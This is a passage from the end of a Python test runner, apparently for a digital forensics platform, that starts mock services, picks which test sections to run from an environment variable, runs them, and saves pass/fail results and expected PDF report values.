    'reg_disabled': [t_reg_disabled],
}

if __name__ == '__main__':
    t0 = time.time()
    _start_vt_mock()
    _start_claude_mock()
    selected = PHASES[PHASE]
    # DFIP_SECTIONS=07b,12b runs only those sections (by number prefix), after the sections every other one
    # builds on: sign-in (02), cases (04), the evidence upload (06) and its analysis (07). A section that needs
    # another one's results (for example 08's file listing) must be listed with it.
    wanted = [s.strip() for s in os.environ.get('DFIP_SECTIONS', '').split(',') if s.strip()]
    if wanted and PHASE == 'main':
        core = {'02', '04', '06', '07'}
        selected = [fn for fn in selected if fn.section_id in core or any(fn.section_id.startswith(w) for w in wanted)]
        print('Running sections:', ', '.join(fn.section_id for fn in selected))
    for fn in selected:
        fn()
    (OUT / f'results-{PHASE}.json').write_text(json.dumps(RESULTS, indent=1, default=str))
    if PHASE == 'main':  # what check_pdf.py looks for in the saved reports
        (OUT / 'pdf_expect.json').write_text(json.dumps({'case': C.get('A'), 'evidence': C.get('E'), 'sha256': C.get('IMG_SHA256'),
                                                         'tamper_case': C.get('TAMPER_CASE')}))
    n_pass = sum(1 for r in RESULTS if r['ok'] is True)
    n_fail = sum(1 for r in RESULTS if r['ok'] is False)
    print(f'\n{PHASE}: {n_pass} passed, {n_fail} failed, {sum(1 for r in RESULTS if r["ok"] is None)} notes in {time.time() - t0:.0f}s')
